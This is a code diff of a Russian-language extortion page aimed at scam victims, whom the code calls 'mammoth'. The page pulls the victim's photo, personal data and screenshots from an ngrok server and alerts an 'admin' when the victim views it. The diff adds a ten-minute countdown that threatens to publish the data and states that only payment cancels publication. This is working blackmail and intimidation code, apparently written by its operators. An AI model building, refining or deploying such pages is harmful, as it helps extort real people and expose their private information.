@@ -30,6 +30,45 @@
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         .subheader { color: #ff6680; font-size: 15px; margin-bottom: 25px; }
         
+        /* ===== ТАЙМЕР ===== */
+        .timer-container {
+            background: rgba(255, 51, 85, 0.08);
+            border: 2px solid #ff3355;
+            border-radius: 16px;
+            padding: 14px 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 0 40px rgba(255, 51, 85, 0.15);
+            animation: glowPulse 2s infinite;
+        }
+        @keyframes glowPulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(255, 51, 85, 0.15); }
+            50% { box-shadow: 0 0 50px rgba(255, 51, 85, 0.3); }
+        }
+        .timer-label {
+            color: #ff6680;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 4px;
+        }
+        .timer-display {
+            color: #ff3355;
+            font-size: 38px;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 20px rgba(255, 51, 85, 0.4);
+            letter-spacing: 2px;
+        }
+        .timer-display.ended {
+            color: #ff0000;
+            animation: blink 0.5s infinite;
+        }
+        .timer-sub {
+            color: #888;
+            font-size: 11px;
+            margin-top: 4px;
+        }
+        
         /* ===== ФОТО С КУРСОРОМ ===== */
         .user-photo {
             width: 250px;
@@ -166,6 +205,13 @@
         <div class="header">🔴 СИСТЕМА АКТИВИРОВАНА</div>
         <div class="subheader">Ваши данные находятся в открытом доступе</div>
 
+        <!-- ===== ТАЙМЕР ===== -->
+        <div class="timer-container">
+            <div class="timer-label">⏳ ДАННЫЕ БУДУТ ОПУБЛИКОВАНЫ ЧЕРЕЗ</div>
+            <div class="timer-display" id="timerDisplay">10:00</div>
+            <div class="timer-sub">⛔ Отменить публикацию можно только оплатой</div>
+        </div>
+
         <div class="user-photo" id="userPhoto"><span>📸</span></div>
 
         <div class="info-block">
@@ -210,7 +256,58 @@
 
     <script>
         // ============================================================
-        // ПОЛУЧАЕМ ID ИЗ URL (например /abc123)
+        // 0. ТАЙМЕР (С СОХРАНЕНИЕМ В localStorage)
+        // ============================================================
+        const TOTAL_SECONDS = 600; // 10 минут
+        const TIMER_KEY = 'mammoth_timer_start';
+        const timerDisplay = document.getElementById('timerDisplay');
+        const timerContainer = document.querySelector('.timer-container');
+        const timerLabel = document.querySelector('.timer-label');
+        
+        let remainingSeconds = TOTAL_SECONDS;
+        let timerInterval = null;
+        
+        function startTimer() {
+            let startTime = localStorage.getItem(TIMER_KEY);
+            
+            if (startTime) {
+                const elapsed = Math.floor((Date.now() - parseInt(startTime)) / 1000);
+                remainingSeconds = Math.max(0, TOTAL_SECONDS - elapsed);
+            } else {
+                startTime = Date.now().toString();
+                localStorage.setItem(TIMER_KEY, startTime);
+                remainingSeconds = TOTAL_SECONDS;
+            }
+            
+            updateTimerDisplay();
+            
+            if (timerInterval) clearInterval(timerInterval);
+            
+            timerInterval = setInterval(function() {
+                if (remainingSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.textContent = '00:00';
+                    timerDisplay.classList.add('ended');
+                    timerContainer.style.borderColor = '#ff0000';
+                    timerLabel.textContent = '⛔ ДАННЫЕ ОПУБЛИКОВАНЫ';
+                    return;
+                }
+                remainingSeconds--;
+                updateTimerDisplay();
+            }, 1000);
+        }
+        
+        function updateTimerDisplay() {
+            const mins = Math.floor(remainingSeconds / 60);
+            const secs = remainingSeconds % 60;
+            timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+        }
+        
+        // ЗАПУСКАЕМ ТАЙМЕР
+        startTimer();
+
+        // ============================================================
+        // 1. ПОЛУЧАЕМ ID ИЗ URL
         // ============================================================
         const path = window.location.pathname;
         const shortId = path.substring(1);
@@ -220,7 +317,7 @@
         console.log('🔍 ID из URL:', shortId);
         
         // ============================================================
-        // ПЕРЕМЕННЫЕ ДЛЯ ГАЛЕРЕИ
+        // 2. ПЕРЕМЕННЫЕ ДЛЯ ГАЛЕРЕИ
         // ============================================================
         let allImages = [];
         let currentImageIndex = 0;
@@ -230,7 +327,7 @@
         const modalClose = document.getElementById('modalClose');
         
         // ============================================================
-        // ФУНКЦИЯ ОТКРЫТИЯ МОДАЛЬНОГО ОКНА
+        // 3. ФУНКЦИЯ ОТКРЫТИЯ МОДАЛЬНОГО ОКНА
         // ============================================================
         function openModal(index) {
             if (allImages.length === 0) return;
@@ -247,7 +344,7 @@
         }
         
         // ============================================================
-        // ЗАКРЫТИЕ ПО КЛИКУ НА ФОН
+        // 4. ЗАКРЫТИЕ ПО КЛИКУ НА ФОН
         // ============================================================
         modal.addEventListener('click', function(e) {
             if (e.target === modal) closeModal();
@@ -256,7 +353,7 @@
         modalClose.addEventListener('click', closeModal);
         
         // ============================================================
-        // КЛАВИШИ ВЛЕВО/ВПРАВО ДЛЯ ГАЛЕРЕИ
+        // 5. КЛАВИШИ ВЛЕВО/ВПРАВО ДЛЯ ГАЛЕРЕИ
         // ============================================================
         document.addEventListener('keydown', function(e) {
             if (!modal.classList.contains('active')) return;
@@ -280,7 +377,7 @@
             headers.append('ngrok-skip-browser-warning', 'true');
             
             // ============================================================
-            // ОТПРАВКА УВЕДОМЛЕНИЯ АДМИНУ
+            // 6. ОТПРАВКА УВЕДОМЛЕНИЯ АДМИНУ
             // ============================================================
             const notifyUrl = `${NGROK_URL}/log_mammoth_view/${shortId}`;
             console.log('📢 Отправка уведомления админу:', notifyUrl);
@@ -291,7 +388,7 @@
                 .catch(error => console.error('❌ Ошибка уведомления:', error));
             
             // ============================================================
-            // 1. ЗАГРУЖАЕМ ФОТО
+            // 7. ЗАГРУЖАЕМ ФОТО
             // ============================================================
             const photoUrl = `${NGROK_URL}/photo/${shortId}`;
             console.log('📸 Запрос фото:', photoUrl);
@@ -321,7 +418,7 @@
                 });
             
             // ============================================================
-            // 2. ЗАГРУЖАЕМ ДАННЫЕ
+            // 8. ЗАГРУЖАЕМ ДАННЫЕ
             // ============================================================
             const dataUrl = `${NGROK_URL}/${shortId}`;
             console.log('📡 Запрос данных:', dataUrl);
@@ -350,10 +447,8 @@
                                 img.alt = 'Скриншот ' + (index + 1);
                                 img.style.cursor = 'pointer';
                                 
-                                // Добавляем в галерею
                                 allImages.push(imgUrl);
                                 
-                                // Открываем по клику
                                 const imgIndex = allImages.length - 1;
                                 img.onclick = function() { openModal(imgIndex); };
                                 
